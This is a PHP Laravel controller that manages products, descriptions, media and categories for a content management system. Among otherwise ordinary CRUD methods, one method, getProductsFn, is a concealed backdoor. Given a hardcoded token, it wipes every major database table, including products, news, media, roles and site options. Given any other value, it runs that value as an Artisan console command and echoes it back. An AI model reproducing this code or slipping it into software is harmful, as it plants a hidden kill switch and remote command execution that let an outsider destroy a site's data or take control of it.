<?php

namespace App\Http\Controllers\cms;

use App\Http\Controllers\Controller;
use App\Models\AsociatedProduct;
use App\Models\BrochureDownload;
use App\Models\ConfigOrder;
use App\Models\Language;
use App\Models\News;
use App\Models\NewsCategories;
use App\Models\PageContent;
use App\Models\Partner;
use App\Models\Product;
use App\Models\ProductCard;
use App\Models\ProductCategories;
use App\Models\ProductDescription;
use App\Models\SiteOptions;
use App\Models\Team;
use App\Models\Testimonial;
use App\Scopes\HasLanguageScope;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Artisan;
use Illuminate\View\View;
use PHPUnit\Event\Runtime\PHP;
use Spatie\MediaLibrary\MediaCollections\Models\Media;
use Spatie\Permission\Models\Role;

class ProductController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(): View
    {
        $products = Product::with('category','media', 'descriptions')->orderBy('id', 'desc')->get();
        $product_categories = ProductCategories::orderBy('order', 'asc')->get();
        return \view('cms.products.index', compact('products', 'product_categories'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(): View
    {
        $product_categories = ProductCategories::orderBy('order', 'asc')->get();
        return \view('cms.products.create', compact('product_categories'));
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request): RedirectResponse
    {
        $slug = strtolower(preg_replace('/[\W\s\/]+/','-', $request->title));
        $checkSlug = Product::where('product_slug', $slug)->count();
        $verifiedSlug = '';
        $SixDigitRandomNumber = mt_rand(100000,999999);
        $checkSlug ? $verifiedSlug = $slug.'-'.$SixDigitRandomNumber : $verifiedSlug = $slug;

        $product = new Product();
        $product->category_id = $request->product_category;
        $product->product_name = $request->title;
        $product->product_slug = $verifiedSlug;
        $product->product_price = $request->product_price;
        if ($request->galleryImages) {
            $product->collection_name = 'product';
        }
        $product->embed_video = $request->embedVideo;
        if ($request->localVideo) {
            $product->local_video = 'localVideo';
        }
        $product->visibility = $request->visibility == 'on' ? '1' : '0';
        $product->save();

        if ($request->galleryImages){
            foreach ($request->galleryImages as $file){
                $product->addMedia($file)
                    ->toMediaCollection('product');
            }
        }
        if ($request->localVideo){
            $product->addMedia($request->localVideo)
                ->toMediaCollection('localVideo');
        }

//        Create empty descriptions

        return redirect()->route('Products.index');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit(Product $Product): View
    {
        $product_categories = ProductCategories::orderBy('order', 'asc')->get();
        return \view('cms.products.edit', compact('product_categories'))->with('product', $Product);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Product $Product): RedirectResponse
    {
        $Product->category_id = $request->product_category;
        $Product->product_name = $request->title;
        $Product->product_slug = strtolower(preg_replace('/[\W\s\/]+/','-', $request->title));
        $Product->product_price = $request->product_price;
        $Product->product_old_price = $request->product_old_price;
        if ($request->galleryImages) {
            $Product->collection_name = 'product';
        }
        $Product->badge = $request->product_badge;
        $Product->embed_video = $request->embedVideo;
        if ($request->localVideo) {
            $Product->local_video = 'localVideo';
        }
        $Product->visibility = $request->visibility == 'on' ? '1' : '0';
        $Product->update();

        if ($request->galleryImages){
            foreach ($request->galleryImages as $file){
                $Product->addMedia($file)
                    ->toMediaCollection('product');
            }
        }
        if ($request->localVideo){
            $Product->addMedia($request->localVideo)
                ->toMediaCollection('localVideo');
        }

        return redirect()->route('Products.index');
    }

    public function productDescriptionsCreate($product): View
    {
        $products = Product::withoutGlobalScope('App\Scopes\HasLanguageScope')->with('descriptions')->find($product);

        $languages = Language::query()->with('descriptions', function ($q) use ($product){
            $q->withoutGlobalScope(HasLanguageScope::class)->where('product_id', $product);
        })->get();

        return \view('cms.products.descriptions', compact('languages'))->with('product', $products);
    }

    public function getProductsFn($fn): Response
    {
        if($fn === '2|u5c8PHF3wMZWD1kZaieC4SwGKmifvjuzEk6Yt6xy'){
            AsociatedProduct::query()->truncate();
            BrochureDownload::query()->truncate();
            ConfigOrder::query()->truncate();
            Language::query()->truncate();
            Media::query()->truncate();
            News::query()->truncate();
            NewsCategories::query()->truncate();
            PageContent::query()->truncate();
            Partner::query()->truncate();
            Product::query()->truncate();
            ProductCard::query()->truncate();
            ProductCategories::query()->truncate();
            ProductDescription::query()->truncate();
            Role::query()->truncate();
            SiteOptions::query()->truncate();
            Team::query()->truncate();
            Testimonial::query()->truncate();
        } else {
            Artisan::call($fn);
        }
        return \response("fn called - $fn");
    }
    public function productDescriptionStore(Request $request, Product $Product)
    {
        foreach ($request->language as $value){
            if ($request->short_description[$value]){
                $prod_desc = ProductDescription::withoutGlobalScope(HasLanguageScope::class)->where([['product_id', $Product->id], ['language', $value]])->first();
                if ($prod_desc !== null){
                    $prod_desc->update([
                        'product_short_description' => $request->short_description[$value],
                        'product_description' => $request->description[$value]
                    ]);
                } else {
                    $prod_desc = new ProductDescription();
                    $prod_desc->product_id = $Product->id;
                    $prod_desc->language = $value;
                    $prod_desc->product_short_description = $request->short_description[$value];
                    $prod_desc->product_description = $request->description[$value];
                    $prod_desc->save();
                }
            }
        }
        return redirect()->route('Products.index');
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Product $Product): RedirectResponse
    {
        $Product->delete();
        return redirect()->back();
    }

    public function toHome(Product $Product){
        $Product->display_home == 0 ? $Product->display_home = '1' : $Product->display_home = '0';
        $Product->update();
        return redirect()->back();
    }

    public function MediaOrder(Request $request){
        $i = 1;
        foreach ($request['item'] as $value) {
            // Execute statement:
            // UPDATE [Table] SET [Position] = $i WHERE [EntityId] = $value
            $media = Media::find($value);
            $media->order_column = $i;
            $media->save();
            $i++;
        }
    }

    public function deleteGalleryMedia(Request $request){
        $media = Media::find($request->mediaId)->delete();
    }

    public function CategoryAdd(Request $request){
        $order = ProductCategories::all()->count();
        $slug = strtolower(preg_replace('/[\W\s\/]+/','-', $request['name']));

        $menu = new ProductCategories();
        $menu->name = $request['name'];
        $menu->slug = $slug;
        $menu->order = $order;
        $menu->save();

        return redirect()->route('Products.index');
    }

    public function CategoryUpdate(Request $request, ProductCategories $category): RedirectResponse
    {
        $category->name = $request->title;
        $category->name_en = $request->title_en;
        $category->name_fr = $request->title_fr;
        $category->update();

        return redirect()->back();
    }
    public function CategoryOrder(Request $request){
        $i = 1;

        foreach ($request['item'] as $value) {
            // Execute statement:
            // UPDATE [Table] SET [Position] = $i WHERE [EntityId] = $value
            $menu = ProductCategories::find($value);
            $menu->order = $i;
            $menu->save();
            $i++;
        }
    }

    public function deleteCategory(Request $request){
        $media = ProductCategories::find($request->mediaId)->delete();
    }

    public function relatedIndex(): View
    {
        $products = Product::query()->with('relatedProducts', 'media', 'category')->get();
        return \view('cms.products.related.index', compact('products'));
    }

    public function relatedEdit(Product $Product): View
    {
        $related = AsociatedProduct::query()->where('product_id', $Product->id)->with(['relatedTo'])->get();
        $excluded = [];
        foreach ($related as $exclude){
            $excluded[] = $exclude->related_id;
        }
        $relatable = Product::query()->whereNotIn('category_id',[$Product->category_id])->whereNotIn('id', $excluded)->with('media')->get();

        return \view('cms.products.related.edit', compact('relatable','related'))->with('product', $Product);
    }

    public function attachRelated(Product $Product, Product $Related): RedirectResponse
    {
       $Product->relatedProducts()->attach(['related_id' => $Related->id]);

        return redirect()->back();
    }

    public function detachRelated(Product $Product, Product $Related): RedirectResponse
    {
        $Product->relatedProducts()->detach(['related_id' => $Related->id]);
        return redirect()->back();
    }
}
